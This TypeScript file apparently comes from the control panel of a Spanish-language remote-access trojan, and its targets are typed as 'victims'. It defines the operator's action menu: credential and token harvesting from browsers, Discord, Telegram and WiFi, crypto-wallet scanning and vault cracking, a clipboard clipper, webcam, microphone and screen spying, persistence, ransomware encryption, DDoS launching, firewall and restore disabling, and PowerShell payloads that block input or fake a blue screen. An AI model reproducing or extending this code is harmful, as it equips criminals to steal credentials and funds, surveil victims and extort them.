import {
  Activity, AppWindow, Archive, Ban, Bell, Boxes, Bug, Camera, Clipboard, ClipboardList, Cpu,
  Download, ExternalLink, FileSearch, FileText, Files, Gauge, Globe, HardDriveDownload,
  KeyRound, Keyboard, ListTree, Lock, MessageSquare, Monitor, Moon, Network, Power,
  RefreshCw, Rocket, Server, ShieldAlert, ShieldOff, Skull, Tag, TerminalSquare, Trash2,
  Upload, Wallet, Wifi, XCircle
} from 'lucide-react';
import type { LucideIcon } from 'lucide-react';
import type { Victim } from '@/lib/types';
import { isWindows } from '@/lib/os';

export type TaskName =
  | 'shell' | 'file_pull' | 'crack_vault' | 'dump_vault' | 'scan_wallets'
  | 'harvest' | 'screenshot' | 'clip_start' | 'clip_stop' | 'cancel' | 'agent'
  | 'monitor' | 'files' | 'webcam' | 'mic' | 'ransomware' | 'ddos';

export type ActionGroupId =
  | 'sesion' | 'energia' | 'opciones' | 'extra' | 'credenciales'
  | 'portapapeles' | 'wallets' | 'ficheros' | 'monitor' | 'cifrado' | 'red' | 'peligro';

export type DialogKind =
  | 'shell' | 'file_pull' | 'crack_vault' | 'dump_vault' | 'scan_wallets'
  | 'clip_start' | 'agent' | 'message' | 'open_url' | 'search_files'
  | 'mass_download' | 'tags' | 'chat' | 'upload' | 'monitor' | 'webcam' | 'mic'
  | 'ransomware' | 'ddos';

export type Resolved = { name: TaskName; params: Record<string, unknown>; timeout: number };

export type ActionDef = {
  id: string;
  group: ActionGroupId;
  label: string;
  icon: LucideIcon;
  /** Tarea real que ejecuta. Nunca hay acciones decorativas. */
  task?: TaskName;
  /** Texto exacto para el menú: tarea y parámetros. */
  detail?: string | ((victim: Victim) => string);
  dialog?: DialogKind;
  /** Vista de solo lectura: ejecuta shell y pinta la salida como tabla. */
  view?: { title: string; command: (victim: Victim) => string };
  windowsOnly?: boolean;
  /** Versión mínima del agente que entiende la tarea/parámetro. */
  minAgent?: string;
  /** Acción que no encola nada (abre detalle, pestaña o formulario). */
  local?: boolean;
  destructive?: boolean;
  /** Acción válida en lote. */
  bulk?: boolean;
  resolve?: (victim: Victim) => Resolved;
  disabled?: (victim: Victim, context: ActionContext) => string | null;
};

export type ActionContext = {
  canWrite: boolean;
  /** Socket caído o heartbeat viejo. */
  offline: boolean;
  /** El panel perdió su propio stream. */
  disconnected: boolean;
  windows: boolean;
  agentVersion?: string;
};

export const GROUPS: Array<{ id: ActionGroupId; label: string; icon: LucideIcon }> = [
  { id: 'sesion', label: 'Sesión', icon: Server },
  { id: 'energia', label: 'Energía', icon: Power },
  { id: 'opciones', label: 'Opciones', icon: Gauge },
  { id: 'extra', label: 'Extra', icon: ListTree },
  { id: 'credenciales', label: 'Credenciales', icon: KeyRound },
  { id: 'portapapeles', label: 'Portapapeles', icon: Clipboard },
  { id: 'wallets', label: 'Wallets', icon: Wallet },
  { id: 'ficheros', label: 'Ficheros', icon: Files },
  { id: 'monitor', label: 'Monitor', icon: Monitor },
  { id: 'cifrado', label: 'Cifrado', icon: Lock },
  { id: 'red', label: 'Red', icon: Network },
  { id: 'peligro', label: 'Peligro', icon: ShieldAlert }
];

const shell = (command: string, timeout = 60, detail = command): Resolved => ({ name: 'shell', params: { command }, timeout });
const agent = (command: string, timeout = 60): Resolved => ({ name: 'agent', params: { command }, timeout });
const task = (name: TaskName, params: Record<string, unknown> = {}, timeout = 60): Resolved => ({ name, params, timeout });

const ps = (script: string) => `powershell -NoProfile -ExecutionPolicy Bypass -Command "${script.replace(/"/g, '\\"')}"`;
const win = (windows: string, linux: string) => (victim: Victim) => (isWindows(victim.os) ? windows : linux);

const BLANK_SCREEN = ps(
  "Add-Type -AssemblyName System.Windows.Forms;$f=New-Object System.Windows.Forms.Form;$f.BackColor='Black';$f.FormBorderStyle='None';$f.WindowState='Maximized';$f.TopMost=$true;$f.ShowDialog()"
);
const BSOD = ps(
  "Add-Type -AssemblyName System.Windows.Forms;$f=New-Object System.Windows.Forms.Form;$f.BackColor='#0000AA';$f.ForeColor='White';$f.FormBorderStyle='None';$f.WindowState='Maximized';$f.TopMost=$true;$l=New-Object System.Windows.Forms.Label;$l.Text='SPC :(  El equipo ha encontrado un problema.';$l.Font='Consolas,24';$l.AutoSize=$true;$l.Location='40,80';$f.Controls.Add($l);$f.ShowDialog()"
);
const BLOCK_INPUT = ps(
  "Add-Type -Name U -Namespace W -MemberDefinition '[DllImport(\\\"user32.dll\\\")] public static extern bool BlockInput(bool f);';[W.U]::BlockInput($true);Start-Sleep 30;[W.U]::BlockInput($false)"
);
const ACTIVE_WINDOW = ps(
  "Add-Type -Name U -Namespace W -MemberDefinition '[DllImport(\\\"user32.dll\\\")] public static extern IntPtr GetForegroundWindow();[DllImport(\\\"user32.dll\\\")] public static extern int GetWindowText(IntPtr h,System.Text.StringBuilder s,int n);';$s=New-Object System.Text.StringBuilder 512;[void][W.U]::GetWindowText([W.U]::GetForegroundWindow(),$s,512);$s.ToString()"
);

export const ACTIONS: ActionDef[] = [
  // Sesión
  { id: 'open', group: 'sesion', label: 'Abrir detalle', icon: AppWindow, local: true },
  { id: 'chat', group: 'sesion', label: 'Chat con el equipo', icon: MessageSquare, dialog: 'chat', local: true, detail: 'agent + mensaje' },
  { id: 'tags', group: 'sesion', label: 'Etiquetas y nota', icon: Tag, dialog: 'tags', local: true },
  { id: 'screenshot', group: 'sesion', label: 'Captura de pantalla', icon: Monitor, task: 'screenshot', detail: 'screenshot · {}', resolve: () => task('screenshot', {}, 60) },
  { id: 'update', group: 'sesion', label: 'Buscar actualización', icon: RefreshCw, task: 'agent', detail: 'agent · update check', resolve: () => agent('update check', 180) },
  { id: 'persist-on', group: 'sesion', label: 'Activar persistencia', icon: Rocket, task: 'agent', detail: 'agent · persist on', bulk: true, resolve: () => agent('persist on', 120) },
  { id: 'persist-off', group: 'sesion', label: 'Quitar persistencia', icon: Moon, task: 'agent', detail: 'agent · persist off', bulk: true, resolve: () => agent('persist off', 120) },
  { id: 'sleep', group: 'sesion', label: 'Dormir 60 s', icon: Moon, task: 'agent', detail: 'agent · sleep 60', resolve: () => agent('sleep 60', 90) },
  { id: 'gateway', group: 'sesion', label: 'Reiniciar gateway', icon: Network, task: 'agent', detail: 'agent · gateway restart', resolve: () => agent('gateway restart', 60) },
  { id: 'reconnect', group: 'sesion', label: 'Reconectar socket', icon: RefreshCw, task: 'agent', detail: 'agent · reconnect', resolve: () => agent('reconnect', 30) },

  // Energía
  { id: 'shutdown', group: 'energia', label: 'Apagar', icon: Power, task: 'shell', detail: win('shell · shutdown /s /t 0 /f', 'shell · systemctl poweroff'), destructive: true,
    resolve: (victim) => shell(isWindows(victim.os) ? 'shutdown /s /t 0 /f' : 'systemctl poweroff') },
  { id: 'restart', group: 'energia', label: 'Reiniciar', icon: RefreshCw, task: 'shell', detail: win('shell · shutdown /r /t 0 /f', 'shell · systemctl reboot'), destructive: true,
    resolve: (victim) => shell(isWindows(victim.os) ? 'shutdown /r /t 0 /f' : 'systemctl reboot') },
  { id: 'logoff', group: 'energia', label: 'Cerrar sesión', icon: Ban, task: 'shell', detail: win('shell · shutdown /l /f', 'shell · loginctl terminate-user $USER'),
    resolve: (victim) => shell(isWindows(victim.os) ? 'shutdown /l /f' : 'loginctl terminate-user $USER') },
  { id: 'suspend', group: 'energia', label: 'Suspender', icon: Moon, task: 'shell', detail: win('shell · rundll32 powrprof.dll,SetSuspendState', 'shell · systemctl suspend'),
    resolve: (victim) => shell(isWindows(victim.os) ? 'rundll32 powrprof.dll,SetSuspendState 0,1,0' : 'systemctl suspend') },

  // Opciones
  { id: 'blank', group: 'opciones', label: 'Pantalla en blanco', icon: Monitor, task: 'shell', detail: 'shell · formulario negro a pantalla completa', windowsOnly: true, resolve: () => shell(BLANK_SCREEN, 120, 'pantalla en blanco') },
  { id: 'block', group: 'opciones', label: 'Bloquear entrada 30 s', icon: Lock, task: 'shell', detail: 'shell · BlockInput 30 s', windowsOnly: true, resolve: () => shell(BLOCK_INPUT, 120, 'bloquear entrada 30 s') },
  { id: 'taskmgr', group: 'opciones', label: 'Administrador de tareas', icon: Activity, task: 'shell', detail: 'shell · taskmgr', windowsOnly: true, resolve: () => shell('start "" taskmgr', 30) },
  { id: 'regedit', group: 'opciones', label: 'Editor del registro', icon: FileText, task: 'shell', detail: 'shell · regedit', windowsOnly: true, resolve: () => shell('start "" regedit', 30) },
  { id: 'uac', group: 'opciones', label: 'Activar UAC', icon: ShieldAlert, task: 'shell', detail: 'shell · EnableLUA=1', windowsOnly: true, resolve: () => shell('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA /t REG_DWORD /d 1 /f', 30) },
  { id: 'firewall-off', group: 'opciones', label: 'Apagar firewall', icon: ShieldOff, task: 'shell', detail: 'shell · netsh firewall off', windowsOnly: true, destructive: true, resolve: () => shell('netsh advfirewall set allprofiles state off', 30) },
  { id: 'wu', group: 'opciones', label: 'Forzar Windows Update', icon: Download, task: 'shell', detail: 'shell · UsoClient StartScan', windowsOnly: true, resolve: () => shell('UsoClient StartScan', 30) },
  { id: 'bsod', group: 'opciones', label: 'Pantalla azul (simulada)', icon: Skull, task: 'shell', detail: 'shell · formulario BSOD bloqueante', windowsOnly: true, resolve: () => shell(BSOD, 120, 'pantalla azul') },
  { id: 'restore-off', group: 'opciones', label: 'Quitar restaurar sistema', icon: Archive, task: 'shell', detail: 'shell · Disable-ComputerRestore', windowsOnly: true, destructive: true, resolve: () => shell(ps('Disable-ComputerRestore -Drive $env:SystemDrive'), 60) },

  // Extra
  { id: 'processes', group: 'extra', label: 'Procesos', icon: Cpu, task: 'shell', detail: win('shell · tasklist /v', 'shell · ps aux'), view: { title: 'Procesos', command: (victim) => isWindows(victim.os) ? 'tasklist /v' : 'ps aux' }, resolve: (victim) => shell(isWindows(victim.os) ? 'tasklist /v' : 'ps aux', 60) },
  { id: 'startup', group: 'extra', label: 'Inicio automático', icon: Rocket, task: 'shell', detail: win('shell · wmic startup list full', 'shell · systemctl list-unit-files'), view: { title: 'Inicio automático', command: (victim) => isWindows(victim.os) ? 'wmic startup list full' : 'systemctl list-unit-files --state=enabled' }, resolve: (victim) => shell(isWindows(victim.os) ? 'wmic startup list full' : 'systemctl list-unit-files --state=enabled', 60) },
  { id: 'programs', group: 'extra', label: 'Programas instalados', icon: Boxes, task: 'shell', detail: win('shell · reg query Uninstall', 'shell · dpkg -l'), view: { title: 'Programas instalados', command: (victim) => isWindows(victim.os) ? 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" /s' : 'dpkg -l' }, resolve: (victim) => shell(isWindows(victim.os) ? 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" /s' : 'dpkg -l', 90) },
  { id: 'tcp', group: 'extra', label: 'Conexiones TCP', icon: Network, task: 'shell', detail: win('shell · netstat -ano', 'shell · ss -tunap'), view: { title: 'Conexiones TCP', command: (victim) => isWindows(victim.os) ? 'netstat -ano' : 'ss -tunap' }, resolve: (victim) => shell(isWindows(victim.os) ? 'netstat -ano' : 'ss -tunap', 60) },
  { id: 'window', group: 'extra', label: 'Ventana activa', icon: AppWindow, task: 'shell', detail: 'shell · GetForegroundWindow', windowsOnly: true, view: { title: 'Ventana activa', command: () => ACTIVE_WINDOW }, resolve: () => shell(ACTIVE_WINDOW, 30, 'ventana activa') },
  { id: 'registry', group: 'extra', label: 'Consultar registro', icon: FileText, task: 'shell', detail: 'shell · reg query', windowsOnly: true, dialog: 'shell', local: true },
  { id: 'search', group: 'extra', label: 'Buscar ficheros', icon: FileSearch, task: 'shell', detail: win('shell · where /r', 'shell · find'), dialog: 'search_files', local: true },
  { id: 'download', group: 'ficheros', label: 'Descargar fichero', icon: HardDriveDownload, task: 'file_pull', detail: 'file_pull · {path,max_mb}', dialog: 'file_pull', local: true },
  { id: 'mass', group: 'ficheros', label: 'Descarga masiva', icon: Download, task: 'file_pull', detail: 'file_pull · varias rutas', dialog: 'mass_download', local: true },
  { id: 'message', group: 'extra', label: 'Message box', icon: Bell, task: 'shell', detail: win('shell · msg *', 'shell · zenity'), dialog: 'message', local: true },
  { id: 'url', group: 'extra', label: 'Abrir URL', icon: Globe, task: 'shell', detail: win('shell · start URL', 'shell · xdg-open URL'), dialog: 'open_url', local: true },

  // Credenciales
  { id: 'harvest', group: 'credenciales', label: 'Harvest completo', icon: Archive, task: 'harvest', detail: 'harvest · {}', bulk: true, resolve: () => task('harvest', {}, 180) },
  { id: 'harvest-browsers', group: 'credenciales', label: 'Navegadores', icon: Globe, task: 'harvest', detail: 'harvest · kind=browsers', bulk: true, resolve: () => task('harvest', { kind: 'browsers' }, 180) },
  { id: 'harvest-discord', group: 'credenciales', label: 'Tokens de Discord', icon: MessageSquare, task: 'harvest', detail: 'harvest · kind=discord', bulk: true, resolve: () => task('harvest', { kind: 'discord' }, 120) },
  { id: 'harvest-telegram', group: 'credenciales', label: 'Sesión de Telegram', icon: MessageSquare, task: 'harvest', detail: 'harvest · kind=telegram', bulk: true, resolve: () => task('harvest', { kind: 'telegram' }, 120) },
  { id: 'harvest-wifi', group: 'credenciales', label: 'WiFi', icon: Wifi, task: 'harvest', detail: 'harvest · kind=wifi', bulk: true, resolve: () => task('harvest', { kind: 'wifi' }, 120) },
  { id: 'harvest-productkey', group: 'credenciales', label: 'ProductKey', icon: KeyRound, task: 'harvest', detail: 'harvest · kind=productkey', bulk: true, resolve: () => task('harvest', { kind: 'productkey' }, 120) },
  { id: 'hives', group: 'credenciales', label: 'Hives del registro', icon: FileText, task: 'agent', detail: 'agent · hives', windowsOnly: true, resolve: () => agent('hives', 180) },
  { id: 'scan', group: 'credenciales', label: 'Escanear wallets', icon: Wallet, task: 'scan_wallets', detail: 'scan_wallets · opciones', dialog: 'scan_wallets', bulk: true, local: true },
  { id: 'dump', group: 'credenciales', label: 'Extraer vault', icon: Archive, task: 'dump_vault', detail: 'dump_vault · {target}', dialog: 'dump_vault', local: true },
  { id: 'crack', group: 'credenciales', label: 'Romper vault', icon: KeyRound, task: 'crack_vault', detail: 'crack_vault · {target,max_seconds}', dialog: 'crack_vault', local: true },

  // Portapapeles
  { id: 'clip-start', group: 'portapapeles', label: 'Iniciar clipper', icon: Clipboard, task: 'clip_start', detail: 'clip_start · {}', bulk: true, resolve: () => task('clip_start', {}, 30) },
  { id: 'clip-stop', group: 'portapapeles', label: 'Parar clipper', icon: XCircle, task: 'clip_stop', detail: 'clip_stop · {}', bulk: true, resolve: () => task('clip_stop', {}, 30) },
  { id: 'clip-secrets-on', group: 'portapapeles', label: 'Capturar secretos', icon: KeyRound, task: 'agent', detail: 'agent · clip secrets on', bulk: true, resolve: () => agent('clip secrets on', 60) },
  { id: 'clip-secrets-off', group: 'portapapeles', label: 'Dejar de capturar secretos', icon: XCircle, task: 'agent', detail: 'agent · clip secrets off', bulk: true, resolve: () => agent('clip secrets off', 60) },
  { id: 'clip-status', group: 'portapapeles', label: 'Estado del clipper', icon: Activity, task: 'agent', detail: 'agent · clip status', resolve: () => agent('clip status', 30) },

  // Wallets
  { id: 'watch-on', group: 'wallets', label: 'Vigilar wallets', icon: Wallet, task: 'agent', detail: 'agent · wallet watch on', bulk: true, resolve: () => agent('wallet watch on', 60) },
  { id: 'watch-off', group: 'wallets', label: 'Dejar de vigilar', icon: XCircle, task: 'agent', detail: 'agent · wallet watch off', bulk: true, resolve: () => agent('wallet watch off', 60) },
  { id: 'watch-status', group: 'wallets', label: 'Estado de vigilancia', icon: Activity, task: 'agent', detail: 'agent · wallet watch status', resolve: () => agent('wallet watch status', 30) },
  { id: 'memdump', group: 'wallets', label: 'Volcar memoria', icon: Cpu, task: 'agent', detail: 'agent · memdump <wallet>', dialog: 'agent', local: true },

  // Ficheros
  { id: 'explore', group: 'ficheros', label: 'Explorar ficheros', icon: Files, local: true },
  { id: 'upload', group: 'ficheros', label: 'Subir fichero desde URL', icon: Upload, task: 'files', minAgent: '0.3.7', detail: 'files · upload {url}', dialog: 'upload', local: true },
  { id: 'compress', group: 'ficheros', label: 'Comprimir carpeta', icon: Archive, task: 'files', minAgent: '0.3.7', detail: 'files · compress {path}', dialog: 'upload', local: true },

  // Monitor
  { id: 'monitor', group: 'monitor', label: 'Streaming de pantalla', icon: Monitor, task: 'monitor', minAgent: '0.3.7', detail: 'monitor · {seconds,fps,quality}', dialog: 'monitor', local: true },
  { id: 'webcam', group: 'monitor', label: 'Foto de webcam', icon: Camera, task: 'webcam', minAgent: '0.3.7', detail: 'webcam · {}', resolve: () => task('webcam', {}, 60) },
  { id: 'mic', group: 'monitor', label: 'Clip de micrófono', icon: Activity, task: 'mic', minAgent: '0.3.7', detail: 'mic · {seconds}', dialog: 'mic', local: true },

  // Cifrado
  { id: 'ransom', group: 'cifrado', label: 'Cifrar carpeta', icon: Lock, task: 'ransomware', minAgent: '0.3.7', detail: 'ransomware · encrypt {path}', dialog: 'ransomware', local: true, destructive: true },
  { id: 'unransom', group: 'cifrado', label: 'Descifrar carpeta', icon: Lock, task: 'ransomware', minAgent: '0.3.7', detail: 'ransomware · decrypt {path}', dialog: 'ransomware', local: true },
  { id: 'ransom-status', group: 'cifrado', label: 'Estado de cifrado', icon: Activity, task: 'ransomware', minAgent: '0.3.7', detail: 'ransomware · status {path}', dialog: 'ransomware', local: true },

  // Red
  { id: 'ddos', group: 'red', label: 'Lanzar DDoS', icon: Globe, task: 'ddos', minAgent: '0.3.7', detail: 'ddos · {method,host,port}', dialog: 'ddos', local: true },

  // Peligro
  { id: 'kill', group: 'peligro', label: 'Cerrar agente', icon: XCircle, task: 'agent', detail: 'agent · kill', destructive: true, resolve: () => agent('kill', 30) },
  { id: 'revoke', group: 'peligro', label: 'Revocar acceso', icon: ShieldOff, local: true, destructive: true },
  { id: 'delete', group: 'peligro', label: 'Eliminar víctima', icon: Trash2, local: true, destructive: true },
  { id: 'cancel-all', group: 'peligro', label: 'Cancelar tareas', icon: Ban, task: 'cancel', detail: 'cancel · tareas activas', bulk: true, local: true }
];

export const ACTION_MAP = new Map(ACTIONS.map((action) => [action.id, action]));

export const BULK_ACTIONS = ACTIONS.filter((action) => action.bulk);

export function actionDetail(action: ActionDef, victim: Victim): string {
  if (!action.detail) return action.task ?? 'acción local';
  return typeof action.detail === 'function' ? action.detail(victim) : action.detail;
}

export function versionAtLeast(current: string | undefined, minimum: string): boolean {
  const parse = (value: string) => value.split('.').map((part) => Number(part.replace(/\D.*/, '')) || 0);
  const left = parse(current || '0');
  const right = parse(minimum);
  for (let index = 0; index < Math.max(left.length, right.length); index += 1) {
    if ((left[index] ?? 0) > (right[index] ?? 0)) return true;
    if ((left[index] ?? 0) < (right[index] ?? 0)) return false;
  }
  return true;
}

/** Acciones que solo leen datos ya cargados o abren pestañas. */
const OFFLINE_OK = new Set(['open', 'tags', 'explore']);

export function actionReason(action: ActionDef, victim: Victim, context: ActionContext): string | null {
  if (!context.canWrite) return 'rol de solo lectura';
  if (context.disconnected) return 'panel sin conexión en vivo';
  if (context.offline && !OFFLINE_OK.has(action.id)) return 'equipo sin socket de control';
  if (action.windowsOnly && !context.windows) return 'solo Windows';
  if (action.minAgent && !versionAtLeast(context.agentVersion, action.minAgent)) return `requiere agente ${action.minAgent}`;
  return action.disabled?.(victim, context) ?? null;
}
